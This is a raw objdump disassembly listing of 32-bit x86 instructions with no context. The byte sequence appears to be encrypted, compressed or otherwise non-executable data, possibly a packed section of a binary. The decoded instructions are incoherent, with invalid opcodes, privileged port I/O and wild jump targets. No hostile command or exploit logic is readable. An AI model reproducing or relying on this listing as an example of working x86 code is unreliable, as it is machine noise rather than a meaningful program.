  435aa6:	db ef                	fucomi %st(7),%st
  435aa8:	88 ae 50 df b4 a4    	mov    %ch,-0x5b4b20b0(%esi)
  435aae:	68 fe ae f3 f2       	push   $0xf2f3aefe
  435ab3:	16                   	push   %ss
  435ab4:	89 7f 20             	mov    %edi,0x20(%edi)
  435ab7:	28 2d 9b 1d ef 8f    	sub    %ch,0x8fef1d9b
  435abd:	7e db                	jle    0x435a9a
  435abf:	b9 3c a2 79 dd       	mov    $0xdd79a23c,%ecx
  435ac4:	55                   	push   %ebp
  435ac5:	27                   	daa
  435ac6:	ed                   	in     (%dx),%eax
  435ac7:	3e 9a 05 bd 8a 15 ab 	ds lcall $0x74ab,$0x158abd05
  435ace:	74 
  435acf:	0e                   	push   %cs
  435ad0:	d9 9b 89 32 57 42    	fstps  0x42573289(%ebx)
  435ad6:	a1 9c 80 5c 26       	mov    0x265c809c,%eax
  435adb:	2b ba 94 c7 85 e0    	sub    -0x1f7a386c(%edx),%edi
  435ae1:	11 cb                	adc    %ecx,%ebx
  435ae3:	74 5c                	je     0x435b41
  435ae5:	f9                   	stc
  435ae6:	45                   	inc    %ebp
  435ae7:	a3 be 43 5e 70       	mov    %eax,0x705e43be
  435aec:	76 45                	jbe    0x435b33
  435aee:	2b 9e fc 89 2e e9    	sub    -0x16d17604(%esi),%ebx
  435af4:	c3                   	ret
  435af5:	b3 dd                	mov    $0xdd,%bl
  435af7:	4c                   	dec    %esp
  435af8:	af                   	scas   %es:(%edi),%eax
  435af9:	1d c4 8a fc a9       	sbb    $0xa9fc8ac4,%eax
  435afe:	b8 9d 12 b6 e2       	mov    $0xe2b6129d,%eax
  435b03:	40                   	inc    %eax
  435b04:	9e                   	sahf
  435b05:	ad                   	lods   %ds:(%esi),%eax
  435b06:	44                   	inc    %esp
  435b07:	6e                   	outsb  %ds:(%esi),(%dx)
  435b08:	29 e5                	sub    %esp,%ebp
  435b0a:	aa                   	stos   %al,%es:(%edi)
  435b0b:	56                   	push   %esi
  435b0c:	44                   	inc    %esp
  435b0d:	73 33                	jae    0x435b42
  435b0f:	d3 f0                	shl    %cl,%eax
  435b11:	cc                   	int3
  435b12:	5e                   	pop    %esi
  435b13:	0f c8                	bswap  %eax
  435b15:	46                   	inc    %esi
  435b16:	e6 8d                	out    %al,$0x8d
  435b18:	a9 09 65 78 c5       	test   $0xc5786509,%eax
  435b1d:	80 d9 0c             	sbb    $0xc,%cl
  435b20:	f8                   	clc
  435b21:	25 83 e8 a5 a4       	and    $0xa4a5e883,%eax
  435b26:	df 98 e3 7d c1 6b    	fistps 0x6bc17de3(%eax)
  435b2c:	1d 43 c8 1d 6b       	sbb    $0x6b1dc843,%eax
  435b31:	cb                   	lret
  435b32:	96                   	xchg   %eax,%esi
  435b33:	e0 21                	loopne 0x435b56
  435b35:	5a                   	pop    %edx
  435b36:	c4 4e 18             	les    0x18(%esi),%ecx
  435b39:	50                   	push   %eax
  435b3a:	38 98 e3 4c 66 bd    	cmp    %bl,-0x4299b31d(%eax)
  435b40:	37                   	aaa
  435b41:	73 c4                	jae    0x435b07
  435b43:	15 4d 13 ae 70       	adc    $0x70ae134d,%eax
  435b48:	3b 40 99             	cmp    -0x67(%eax),%eax
  435b4b:	b8 a9 d8 0a cb       	mov    $0xcb0ad8a9,%eax
  435b50:	1c 9d                	sbb    $0x9d,%al
  435b52:	57                   	push   %edi
  435b53:	67 72 c9             	addr16 jb 0x435b1f
  435b56:	28 9d 4d 0b f8 32    	sub    %bl,0x32f80b4d(%ebp)
  435b5c:	91                   	xchg   %eax,%ecx
  435b5d:	6c                   	insb   (%dx),%es:(%edi)
  435b5e:	35 cc f8 71 11       	xor    $0x1171f8cc,%eax
  435b63:	39 31                	cmp    %esi,(%ecx)
  435b65:	4d                   	dec    %ebp
  435b66:	f9                   	stc
  435b67:	21 2a                	and    %ebp,(%edx)
  435b69:	4a                   	dec    %edx
  435b6a:	d6                   	salc
  435b6b:	e6 52                	out    %al,$0x52
  435b6d:	af                   	scas   %es:(%edi),%eax
  435b6e:	86 8f 3a 21 1d 92    	xchg   %cl,-0x6de2dec6(%edi)
  435b74:	ad                   	lods   %ds:(%esi),%eax
  435b75:	5c                   	pop    %esp
  435b76:	db ff                	(bad)
  435b78:	fc                   	cld
  435b79:	f1                   	int1
  435b7a:	17                   	pop    %ss
  435b7b:	f7 eb                	imul   %ebx
  435b7d:	17                   	pop    %ss
  435b7e:	01 c7                	add    %eax,%edi
  435b80:	e9 f7 3f e1 20       	jmp    0x21249b7c
  435b85:	b3 32                	mov    $0x32,%bl
  435b87:	f2 8c f2             	repnz mov %?,%edx
  435b8a:	36 d9 84 b5 d7 67 51 	flds   %ss:-0x74ae9829(%ebp,%esi,4)
  435b91:	8b 
  435b92:	1a 2f                	sbb    (%edi),%ch
  435b94:	61                   	popa
  435b95:	ab                   	stos   %eax,%es:(%edi)
  435b96:	83 02 49             	addl   $0x49,(%edx)
  435b99:	aa                   	stos   %al,%es:(%edi)
  435b9a:	0a 2b                	or     (%ebx),%ch
  435b9c:	3f                   	aas
  435b9d:	0f c7                	(bad)
  435b9f:	d4 87                	aam    $0x87
  435ba1:	d1 70 d3             	shll   $1,-0x2d(%eax)
  435ba4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435ba5:	c3                   	ret
  435ba6:	81 15 43 a8 d8 c6 e5 	adcl   $0xea13d9e5,0xc6d8a843
  435bad:	d9 13 ea 
  435bb0:	43                   	inc    %ebx
  435bb1:	2c 3c                	sub    $0x3c,%al
  435bb3:	d8 11                	fcoms  (%ecx)
  435bb5:	c7                   	(bad)
  435bb6:	53                   	push   %ebx
  435bb7:	2b 25 8a 03 af d7    	sub    0xd7af038a,%esp
  435bbd:	2a 0a                	sub    (%edx),%cl
  435bbf:	a8 c3                	test   $0xc3,%al
  435bc1:	73 48                	jae    0x435c0b
  435bc3:	81 28 e8 a8 dc 12    	subl   $0x12dca8e8,(%eax)
  435bc9:	01 3e                	add    %edi,(%esi)
  435bcb:	fd                   	std
  435bcc:	5b                   	pop    %ebx
  435bcd:	6e                   	outsb  %ds:(%esi),(%dx)
  435bce:	f8                   	clc
  435bcf:	ed                   	in     (%dx),%eax
  435bd0:	51                   	push   %ecx
  435bd1:	a8 87                	test   $0x87,%al
  435bd3:	14 c8                	adc    $0xc8,%al
  435bd5:	d9 0b                	(bad) (%ebx)
  435bd7:	20 88 b8 54 e1 05    	and    %cl,0x5e154b8(%eax)
  435bdd:	8a 93 a2 72 9b 1e    	mov    0x1e9b72a2(%ebx),%dl
  435be3:	27                   	daa
  435be4:	6e                   	outsb  %ds:(%esi),(%dx)
  435be5:	62 99 ba c3 3b 9c    	bound  %ebx,-0x63c43c46(%ecx)
  435beb:	4c                   	dec    %esp
  435bec:	6c                   	insb   (%dx),%es:(%edi)
  435bed:	fd                   	std
  435bee:	b1 f2                	mov    $0xf2,%cl
  435bf0:	9d                   	popf
  435bf1:	f9                   	stc
  435bf2:	c3                   	ret
  435bf3:	88 82 85 12 3e 77    	mov    %al,0x773e1285(%edx)
  435bf9:	91                   	xchg   %eax,%ecx
  435bfa:	3a 75 42             	cmp    0x42(%ebp),%dh
  435bfd:	da d6                	fcmovbe %st(6),%st
  435bff:	3e 04 6c             	ds add $0x6c,%al
  435c02:	ac                   	lods   %ds:(%esi),%al
  435c03:	3c 30                	cmp    $0x30,%al
  435c05:	9c                   	pushf
  435c06:	79 af                	jns    0x435bb7
  435c08:	74 ba                	je     0x435bc4
  435c0a:	bc d7 6b 2d 87       	mov    $0x872d6bd7,%esp
  435c0f:	38 61 3f             	cmp    %ah,0x3f(%ecx)
  435c12:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435c13:	72 3c                	jb     0x435c51
  435c15:	9b                   	fwait
  435c16:	e3 18                	jecxz  0x435c30
  435c18:	84 e9                	test   %ch,%cl
  435c1a:	bb 4d fd ea 2b       	mov    $0x2beafd4d,%ebx
  435c1f:	e7 2e                	out    %eax,$0x2e
  435c21:	0d a5 b4 bf cd       	or     $0xcdbfb4a5,%eax
  435c26:	0b 8e ba 31 d9 ae    	or     -0x5126ce46(%esi),%ecx
  435c2c:	62 2b                	bound  %ebp,(%ebx)
  435c2e:	f2 99                	repnz cltd
  435c30:	bb 48 5c 5c a3       	mov    $0xa35c5c48,%ebx
  435c35:	10 78 a3             	adc    %bh,-0x5d(%eax)
  435c38:	1d 70 d3 2d a4       	sbb    $0xa42dd370,%eax
  435c3d:	fa                   	cli
  435c3e:	bd 21 b7 ec 10       	mov    $0x10ecb721,%ebp
  435c43:	33 ad 6d 1f ee 9d    	xor    -0x6211e093(%ebp),%ebp
  435c49:	f6 45 3e 3b          	testb  $0x3b,0x3e(%ebp)
  435c4d:	f0 df 07             	lock filds (%edi)
  435c50:	cc                   	int3
  435c51:	00 f0                	add    %dh,%al
  435c53:	72 4e                	jb     0x435ca3
  435c55:	a0 9a d4 8e 3a       	mov    0x3a8ed49a,%al
  435c5a:	f1                   	int1
  435c5b:	3b 92 a9 03 e3 d7    	cmp    -0x281cfc57(%edx),%edx
  435c61:	e3 32                	jecxz  0x435c95
  435c63:	2c 69                	sub    $0x69,%al
  435c65:	f0 68 71 99 9f a2    	lock push $0xa29f9971
  435c6b:	0d 5a fb 82 f8       	or     $0xf882fb5a,%eax
  435c70:	f1                   	int1
  435c71:	8d 21                	lea    (%ecx),%esp
  435c73:	36 bd 15 79 95 76    	ss mov $0x76957915,%ebp
  435c79:	49                   	dec    %ecx
  435c7a:	23 5a 85             	and    -0x7b(%edx),%ebx
  435c7d:	d3 b1 ea 79 02 8c    	shll   %cl,-0x73fd8616(%ecx)
  435c83:	e4 b2                	in     $0xb2,%al
  435c85:	c0 96 a0 6d 6f 08 86 	rclb   $0x86,0x86f6da0(%esi)
  435c8c:	c4 1c 67             	les    (%edi,%eiz,2),%ebx
  435c8f:	1c 78                	sbb    $0x78,%al
  435c91:	d4 26                	aam    $0x26
  435c93:	9d                   	popf
  435c94:	f0 5d                	lock pop %ebp
  435c96:	c5 99 f4 bc c5 c9    	lds    -0x363a430c(%ecx),%ebx
  435c9c:	2c 3e                	sub    $0x3e,%al
  435c9e:	45                   	inc    %ebp
  435c9f:	ac                   	lods   %ds:(%esi),%al
  435ca0:	b0 34                	mov    $0x34,%al
  435ca2:	96                   	xchg   %eax,%esi
  435ca3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435ca4:	d5 c3                	aad    $0xc3
  435ca6:	f9                   	stc
  435ca7:	d6                   	salc
  435ca8:	8c c4                	mov    %es,%esp
  435caa:	bd 61 c8 59 e7       	mov    $0xe759c861,%ebp
  435caf:	1d da c7 5f 71       	sbb    $0x715fc7da,%eax
  435cb4:	5b                   	pop    %ebx
  435cb5:	ba 66 c0 b2 9b       	mov    $0x9bb2c066,%edx
  435cba:	32 7d 24             	xor    0x24(%ebp),%bh
  435cbd:	85 92 6e 95 8e b5    	test   %edx,-0x4a716a92(%edx)
  435cc3:	1d 20 50 88 51       	sbb    $0x51885020,%eax
  435cc8:	2c 7c                	sub    $0x7c,%al
  435cca:	dd 1e                	fstpl  (%esi)
  435ccc:	de 31                	fidivs (%ecx)
  435cce:	7d bb                	jge    0x435c8b
  435cd0:	f2 ee                	repnz out %al,(%dx)
  435cd2:	ec                   	in     (%dx),%al
  435cd3:	25 39 d6 da 1a       	and    $0x1adad639,%eax
  435cd8:	03 d8                	add    %eax,%ebx
  435cda:	34 87                	xor    $0x87,%al
  435cdc:	04 0c                	add    $0xc,%al
  435cde:	eb be                	jmp    0x435c9e
  435ce0:	ec                   	in     (%dx),%al
  435ce1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435ce2:	c7                   	(bad)
  435ce3:	fe 4c bf d9          	decb   -0x27(%edi,%edi,4)
  435ce7:	87 0f                	xchg   %ecx,(%edi)
  435ce9:	e7 d5                	out    %eax,$0xd5
  435ceb:	07                   	pop    %es
  435cec:	be 27 6d d6 a0       	mov    $0xa0d66d27,%esi
  435cf1:	19 17                	sbb    %edx,(%edi)
  435cf3:	1b 27                	sbb    (%edi),%esp
  435cf5:	8a 3d 4c 86 5b 6d    	mov    0x6d5b864c,%bh
  435cfb:	8d 61 64             	lea    0x64(%ecx),%esp
  435cfe:	cf                   	iret
  435cff:	58                   	pop    %eax
  435d00:	96                   	xchg   %eax,%esi
  435d01:	e8 1a 83 c6 fe       	call   0xff09e020
  435d06:	97                   	xchg   %eax,%edi
  435d07:	17                   	pop    %ss
  435d08:	c3                   	ret
  435d09:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435d0a:	03 84 a2 d4 8b ec ee 	add    -0x1113742c(%edx,%eiz,4),%eax
  435d11:	37                   	aaa
  435d12:	6c                   	insb   (%dx),%es:(%edi)
  435d13:	32 2f                	xor    (%edi),%ch
  435d15:	ea b2 e7 33 82 f3 17 	ljmp   $0x17f3,$0x8233e7b2
  435d1c:	bd 94 51 67 72       	mov    $0x72675194,%ebp
  435d21:	ff 49 71             	decl   0x71(%ecx)
  435d24:	af                   	scas   %es:(%edi),%eax
  435d25:	02 61 bb             	add    -0x45(%ecx),%ah
  435d28:	bb d0 85 74 6a       	mov    $0x6a7485d0,%ebx
  435d2d:	ac                   	lods   %ds:(%esi),%al
  435d2e:	bc 32 73 5d 07       	mov    $0x75d7332,%esp
  435d33:	e3 9c                	jecxz  0x435cd1
  435d35:	03 ce                	add    %esi,%ecx
  435d37:	07                   	pop    %es
  435d38:	81 bf bf da ee 56 8d 	cmpl   $0xccdcae8d,0x56eedabf(%edi)
  435d3f:	ae dc cc 
  435d42:	6e                   	outsb  %ds:(%esi),(%dx)
  435d43:	fb                   	sti
  435d44:	09 34 2c             	or     %esi,(%esp,%ebp,1)
  435d47:	87 5f 6e             	xchg   %ebx,0x6e(%edi)
  435d4a:	b4 9f                	mov    $0x9f,%ah
  435d4c:	37                   	aaa
  435d4d:	08 95 81 b2 0b 99    	or     %dl,-0x66f44d7f(%ebp)
  435d53:	4f                   	dec    %edi
  435d54:	59                   	pop    %ecx
  435d55:	73 4f                	jae    0x435da6
  435d57:	b4 35                	mov    $0x35,%ah
  435d59:	bb b0 26 2e 36       	mov    $0x362e26b0,%ebx
  435d5e:	f8                   	clc
  435d5f:	8c bf ee b5 9b 49    	mov    %?,0x499bb5ee(%edi)
  435d65:	34 1a                	xor    $0x1a,%al
  435d67:	9a cd 20 11 fc d7 f2 	lcall  $0xf2d7,$0xfc1120cd
  435d6e:	d9 16                	fsts   (%esi)
  435d70:	3e c4 bb d0 62 45 cb 	les    %ds:-0x34ba9d30(%ebx),%edi
  435d77:	d6                   	salc
  435d78:	04 d5                	add    $0xd5,%al
  435d7a:	6c                   	insb   (%dx),%es:(%edi)
  435d7b:	3b 00                	cmp    (%eax),%eax
  435d7d:	85 4b fa             	test   %ecx,-0x6(%ebx)
  435d80:	aa                   	stos   %al,%es:(%edi)
  435d81:	59                   	pop    %ecx
  435d82:	6a a1                	push   $0xffffffa1
  435d84:	30 cb                	xor    %cl,%bl
  435d86:	f3 9d                	repz popf
  435d88:	2f                   	das
  435d89:	f8                   	clc
  435d8a:	36 07                	ss pop %es
  435d8c:	55                   	push   %ebp
  435d8d:	b6 c5                	mov    $0xc5,%dh
  435d8f:	95                   	xchg   %eax,%ebp
  435d90:	df cf                	(bad)
  435d92:	d6                   	salc
  435d93:	7b ee                	jnp    0x435d83
  435d95:	7c f3                	jl     0x435d8a
  435d97:	85 e7                	test   %esp,%edi
  435d99:	62 d2 42             	(bad) {%k1}{z}
  435d9c:	e9 ef c6 98 81       	jmp    0x81dc2490
  435da1:	50                   	push   %eax
  435da2:	12 92 14 f5 ee b5    	adc    -0x4a110aec(%edx),%dl
  435da8:	cf                   	iret
  435da9:	43                   	inc    %ebx
  435daa:	16                   	push   %ss
  435dab:	8a f5                	mov    %ch,%dh
  435dad:	23 b7 9d 74 9e f8    	and    -0x7618b63(%edi),%esi
  435db3:	28 42 5d             	sub    %al,0x5d(%edx)
  435db6:	f7 ee                	imul   %esi
  435db8:	49                   	dec    %ecx
  435db9:	f1                   	int1
  435dba:	19 65 d9             	sbb    %esp,-0x27(%ebp)
  435dbd:	a0 14 0d cb 4b       	mov    0x4bcb0d14,%al
  435dc2:	63 dd                	arpl   %ebx,%ebp
  435dc4:	84 fc                	test   %bh,%ah
  435dc6:	4e                   	dec    %esi
  435dc7:	cd 7e                	int    $0x7e
  435dc9:	5a                   	pop    %edx
  435dca:	26 b1 29             	es mov $0x29,%cl
  435dcd:	75 51                	jne    0x435e20
  435dcf:	c7                   	(bad)
  435dd0:	a9 fb 53 7c 2b       	test   $0x2b7c53fb,%eax
  435dd5:	02 7c bc 46          	add    0x46(%esp,%edi,4),%bh
  435dd9:	bb ae b5 ad d9       	mov    $0xd9adb5ae,%ebx
  435dde:	d2 15 b8 e4 26 b4    	rclb   %cl,0xb426e4b8
  435de4:	c6                   	(bad)
  435de5:	b6 86                	mov    $0x86,%dh
  435de7:	fe                   	(bad)
  435de8:	be 5c 0b f2 db       	mov    $0xdbf20b5c,%esi
  435ded:	89 dd                	mov    %ebx,%ebp
  435def:	3a b2 5a 0b 86 cf    	cmp    -0x3079f4a6(%edx),%dh
  435df5:	70 72                	jo     0x435e69
  435df7:	4b                   	dec    %ebx
  435df8:	98                   	cwtl
  435df9:	69 a6 fa 30 1c dd 68 	imul   $0xfa0b5c68,-0x22e3cf06(%esi),%esp
  435e00:	5c 0b fa 
  435e03:	dc 35 45 82 62 fa    	fdivl  0xfa628245
  435e09:	c0 67 00 56          	shlb   $0x56,0x0(%edi)
  435e0d:	eb 94                	jmp    0x435da3
  435e0f:	6d                   	insl   (%dx),%es:(%edi)
  435e10:	27                   	daa
  435e11:	38 34 59             	cmp    %dh,(%ecx,%ebx,2)
  435e14:	58                   	pop    %eax
  435e15:	85 5d a2             	test   %ebx,-0x5e(%ebp)
  435e18:	fc                   	cld
  435e19:	72 99                	jb     0x435db4
  435e1b:	6d                   	insl   (%dx),%es:(%edi)
  435e1c:	a0 56 45 94 31       	mov    0x31944556,%al
  435e21:	6f                   	outsl  %ds:(%esi),(%dx)
  435e22:	bc 9f 43 73 fd       	mov    $0xfd73439f,%esp
  435e27:	37                   	aaa
  435e28:	c7                   	(bad)
  435e29:	0d f3 e0 05 61       	or     $0x6105e0f3,%eax
  435e2e:	39 36                	cmp    %esi,(%esi)
  435e30:	f5                   	cmc
  435e31:	38 e3                	cmp    %ah,%bl
  435e33:	05 c6 ce 9e 23       	add    $0x239ecec6,%eax
  435e38:	a8 24                	test   $0x24,%al
  435e3a:	71 8b                	jno    0x435dc7
  435e3c:	56                   	push   %esi
  435e3d:	a1 d4 e2 86 78       	mov    0x7886e2d4,%eax
  435e42:	19 0c 08             	sbb    %ecx,(%eax,%ecx,1)
  435e45:	14 73                	adc    $0x73,%al
  435e47:	3b 41 0e             	cmp    0xe(%ecx),%eax
  435e4a:	fe                   	(bad)
  435e4b:	e3 8f                	jecxz  0x435ddc
  435e4d:	ae                   	scas   %es:(%edi),%al
  435e4e:	f3 cc                	repz int3
  435e50:	64 8a c6             	fs mov %dh,%al
  435e53:	70 1e                	jo     0x435e73
  435e55:	30 fe                	xor    %bh,%dh
  435e57:	25 91 df 8b 45       	and    $0x458bdf91,%eax
  435e5c:	6e                   	outsb  %ds:(%esi),(%dx)
  435e5d:	ca f7 3a             	lret   $0x3af7
  435e60:	f6 34 6d 56 7a fc 0f 	divb   0xffc7a56(,%ebp,2)
  435e67:	87 f1                	xchg   %esi,%ecx
  435e69:	e6 e8                	out    %al,$0xe8
  435e6b:	77 cd                	ja     0x435e3a
  435e6d:	45                   	inc    %ebp
  435e6e:	6b 2c d7 3f          	imul   $0x3f,(%edi,%edx,8),%ebp
  435e72:	be b2 57 b7 4d       	mov    $0x4db757b2,%esi
  435e77:	7b db                	jnp    0x435e54
  435e79:	11 a0 34 5d f6 02    	adc    %esp,0x2f65d34(%eax)
  435e7f:	92                   	xchg   %eax,%edx
  435e80:	af                   	scas   %es:(%edi),%eax
  435e81:	6b eb 4e             	imul   $0x4e,%ebx,%ebp
  435e84:	1c 24                	sbb    $0x24,%al
  435e86:	74 47                	je     0x435ecf
  435e88:	71 cd                	jno    0x435e57
  435e8a:	c9                   	leave
  435e8b:	5d                   	pop    %ebp
  435e8c:	1e                   	push   %ds
  435e8d:	ac                   	lods   %ds:(%esi),%al
  435e8e:	2d cc 67 10 22       	sub    $0x221067cc,%eax
  435e93:	32 e8                	xor    %al,%ch
  435e95:	60                   	pusha
  435e96:	86 88 41 3b c8 53    	xchg   %cl,0x53c83b41(%eax)
  435e9c:	5b                   	pop    %ebx
  435e9d:	d1 b8 a9 e8 b1 6d    	sarl   $1,0x6db1e8a9(%eax)
  435ea3:	8e 60 96             	mov    -0x6a(%eax),%fs
  435ea6:	2a 61 e1             	sub    -0x1f(%ecx),%ah
  435ea9:	f7 f8                	idiv   %eax
  435eab:	dc 51 f3             	fcoml  -0xd(%ecx)
  435eae:	9a 78 40 55 0e 4d c2 	lcall  $0xc24d,$0xe554078
  435eb5:	af                   	scas   %es:(%edi),%eax
  435eb6:	24 ed                	and    $0xed,%al
  435eb8:	97                   	xchg   %eax,%edi
  435eb9:	2d 62 d5 c4 a0       	sub    $0xa0c4d562,%eax
  435ebe:	bb c5 9e a3 83       	mov    $0x83a39ec5,%ebx
  435ec3:	03 55 47             	add    0x47(%ebp),%edx
  435ec6:	20 cd                	and    %cl,%ch
  435ec8:	97                   	xchg   %eax,%edi
  435ec9:	5a                   	pop    %edx
  435eca:	12 86 76 55 d0 b9    	adc    -0x462faa8a(%esi),%al
  435ed0:	fd                   	std
  435ed1:	53                   	push   %ebx
  435ed2:	60                   	pusha
  435ed3:	6f                   	outsl  %ds:(%esi),(%dx)
  435ed4:	01 7b 80             	add    %edi,-0x80(%ebx)
  435ed7:	5e                   	pop    %esi
  435ed8:	a1 d6 85 f3 39       	mov    0x39f385d6,%eax
  435edd:	93                   	xchg   %eax,%ebx
  435ede:	cc                   	int3
  435edf:	9a 7d 3a 9a c2 e0 cb 	lcall  $0xcbe0,$0xc29a3a7d
  435ee6:	94                   	xchg   %eax,%esp
  435ee7:	79 ed                	jns    0x435ed6
  435ee9:	e2 38                	loop   0x435f23
  435eeb:	4e                   	dec    %esi
  435eec:	d6                   	salc
  435eed:	f2 ef                	repnz out %eax,(%dx)
  435eef:	48                   	dec    %eax
  435ef0:	96                   	xchg   %eax,%esi
  435ef1:	87 56 a5             	xchg   %edx,-0x5b(%esi)
  435ef4:	69 cb 40 49 a6 eb    	imul   $0xeba64940,%ebx,%ecx
  435efa:	42                   	inc    %edx
  435efb:	06                   	push   %es
  435efc:	54                   	push   %esp
  435efd:	4d                   	dec    %ebp
  435efe:	10 21                	adc    %ah,(%ecx)
  435f00:	91                   	xchg   %eax,%ecx
  435f01:	b6 4c                	mov    $0x4c,%dh
  435f03:	6d                   	insl   (%dx),%es:(%edi)
  435f04:	63 a2 3d ea d3 08    	arpl   %esp,0x8d3ea3d(%edx)
  435f0a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  435f0b:	97                   	xchg   %eax,%edi
  435f0c:	62 a5 86 81 5f e0    	bound  %esp,-0x1fa07e7a(%ebp)
  435f12:	3a 59 1e             	cmp    0x1e(%ecx),%bl
  435f15:	d9 82 37 66 9b 0e    	flds   0xe9b6637(%edx)
  435f1b:	77 a8                	ja     0x435ec5
  435f1d:	82 97 84 f0 c7 d1 e7 	adcb   $0xe7,-0x2e380f7c(%edi)
  435f24:	6b 5d 00 77          	imul   $0x77,0x0(%ebp),%ebx
  435f28:	8b 27                	mov    (%edi),%esp
  435f2a:	6b 13 5b             	imul   $0x5b,(%ebx),%edx
  435f2d:	4f                   	dec    %edi
  435f2e:	d7                   	xlat   %ds:(%ebx)
  435f2f:	86 be c1 2b 38 1f    	xchg   %bh,0x1f382bc1(%esi)
  435f35:	73 75                	jae    0x435fac
  435f37:	58                   	pop    %eax
  435f38:	f7 5e 1a             	negl   0x1a(%esi)
  435f3b:	02 42 54             	add    0x54(%edx),%al
  435f3e:	88 67 1b             	mov    %ah,0x1b(%edi)
  435f41:	c0 17 4e             	rclb   $0x4e,(%edi)
  435f44:	10 a8 b6 a0 22 d5    	adc    %ch,-0x2add5f4a(%eax)
  435f4a:	42                   	inc    %edx
  435f4b:	8b b1 14 0b e2 8b    	mov    -0x741df4ec(%ecx),%esi
  435f51:	ae                   	scas   %es:(%edi),%al
  435f52:	40                   	inc    %eax
  435f53:	37                   	aaa
  435f54:	3a 27                	cmp    (%edi),%ah
  435f56:	7d f9                	jge    0x435f51
  435f58:	77 4f                	ja     0x435fa9
  435f5a:	a2 cb d0 a4 cf       	mov    %al,0xcfa4d0cb
  435f5f:	f7 0f 2c 1d c8 a5    	testl  $0xa5c81d2c,(%edi)
  435f65:	6a 8c                	push   $0xffffff8c
  435f67:	08 4e e1             	or     %cl,-0x1f(%esi)
  435f6a:	36 f6 24 ec          	mulb   %ss:(%esp,%ebp,8)
  435f6e:	3c 66                	cmp    $0x66,%al
  435f70:	28 3a                	sub    %bh,(%edx)
  435f72:	50                   	push   %eax
  435f73:	d7                   	xlat   %ds:(%ebx)
  435f74:	b8 1b 53 12 21       	mov    $0x2112531b,%eax
  435f79:	6f                   	outsl  %ds:(%esi),(%dx)
  435f7a:	11 33                	adc    %esi,(%ebx)
  435f7c:	e4 1c                	in     $0x1c,%al
  435f7e:	47                   	inc    %edi
  435f7f:	36 0d 10 b9 c2 9f    	ss or  $0x9fc2b910,%eax
  435f85:	70 b8                	jo     0x435f3f
  435f87:	65 52                	gs push %edx
  435f89:	49                   	dec    %ecx
  435f8a:	2e de 6a 6e          	fisubrs %cs:0x6e(%edx)
  435f8e:	23 d3                	and    %ebx,%edx
  435f90:	a0 2f 7d 4e 32       	mov    0x324e7d2f,%al
  435f95:	b1 dd                	mov    $0xdd,%cl
  435f97:	f2 df ef             	repnz fucomip %st(7),%st
  435f9a:	6b 17 01             	imul   $0x1,(%edi),%edx
  435f9d:	c1 5a a3 69          	rcrl   $0x69,-0x5d(%edx)
  435fa1:	b8 1a 3e fd 81       	mov    $0x81fd3e1a,%eax
  435fa6:	23 fe                	and    %esi,%edi
  435fa8:	7c 7e                	jl     0x436028
  435faa:	39 29                	cmp    %ebp,(%ecx)
  435fac:	b9 f3 cd 27 7f       	mov    $0x7f27cdf3,%ecx
  435fb1:	43                   	inc    %ebx
  435fb2:	be dd 20 6e e1       	mov    $0xe16e20dd,%esi
  435fb7:	95                   	xchg   %eax,%ebp
  435fb8:	98                   	cwtl
  435fb9:	2d da 6f a1 76       	sub    $0x76a16fda,%eax
  435fbe:	90                   	nop
  435fbf:	10 38                	adc    %bh,(%eax)
  435fc1:	10 b3 fc 91 1c a1    	adc    %dh,-0x5ee36e04(%ebx)
  435fc7:	b6 26                	mov    $0x26,%dh
  435fc9:	d8 42 e6             	fadds  -0x1a(%edx)
  435fcc:	64 c3                	fs ret
  435fce:	6e                   	outsb  %ds:(%esi),(%dx)
  435fcf:	a1 65 d9 08 b2       	mov    0xb208d965,%eax
  435fd4:	e1 8a                	loope  0x435f60
  435fd6:	2b b3 80 73 3c 18    	sub    0x183c7380(%ebx),%esi
  435fdc:	4e                   	dec    %esi
  435fdd:	3d f1 9d f0 79       	cmp    $0x79f09df1,%eax
  435fe2:	97                   	xchg   %eax,%edi
  435fe3:	d2 71 d4             	shlb   %cl,-0x2c(%ecx)
  435fe6:	01 58 19             	add    %ebx,0x19(%eax)
  435fe9:	b4 a9                	mov    $0xa9,%ah
  435feb:	56                   	push   %esi
  435fec:	15 8a b9 53 e1       	adc    $0xe153b98a,%eax
  435ff1:	88 61 56             	mov    %ah,0x56(%ecx)
  435ff4:	15 1f d6 0d f2       	adc    $0xf20dd61f,%eax
  435ff9:	b3 75                	mov    $0x75,%bl
  435ffb:	e2 ed                	loop   0x435fea
  435ffd:	21 39                	and    %edi,(%ecx)
  435fff:	37                   	aaa
  436000:	5d                   	pop    %ebp
  436001:	0e                   	push   %cs
  436002:	b1 dd                	mov    $0xdd,%cl
  436004:	bc a9 f7 d0 c8       	mov    $0xc8d0f7a9,%esp
  436009:	7d f5                	jge    0x436000
  43600b:	50                   	push   %eax
  43600c:	2c f8                	sub    $0xf8,%al
  43600e:	b9 97 65 ef 12       	mov    $0x12ef6597,%ecx
  436013:	cd 1d                	int    $0x1d
  436015:	5a                   	pop    %edx
  436016:	b5 91                	mov    $0x91,%ch
  436018:	02 e3                	add    %bl,%ah
  43601a:	f2 23 42 eb          	repnz and -0x15(%edx),%eax
  43601e:	2c 49                	sub    $0x49,%al
  436020:	6c                   	insb   (%dx),%es:(%edi)
  436021:	b9 21 1d 7d ed       	mov    $0xed7d1d21,%ecx
  436026:	ae                   	scas   %es:(%edi),%al
  436027:	c1 4c fc 59 0c       	rorl   $0xc,0x59(%esp,%edi,8)
  43602c:	12 a1 ba 2f 12 89    	adc    -0x76edd046(%ecx),%ah
  436032:	0b 1e                	or     (%esi),%ebx
  436034:	50                   	push   %eax
  436035:	61                   	popa
  436036:	58                   	pop    %eax
  436037:	a2 47 d4 5d 77       	mov    %al,0x775dd447
  43603c:	ff b1 f8 db 9e 71    	push   0x719edbf8(%ecx)
  436042:	38 b9 82 2c 8c 6b    	cmp    %bh,0x6b8c2c82(%ecx)
  436048:	69 7b c0 dc eb 17 b4 	imul   $0xb417ebdc,-0x40(%ebx),%edi
  43604f:	5e                   	pop    %esi
  436050:	43                   	inc    %ebx
  436051:	ba 9e 33 4c d3       	mov    $0xd34c339e,%edx
  436056:	16                   	push   %ss
  436057:	6a 3e                	push   $0x3e
  436059:	eb b3                	jmp    0x43600e
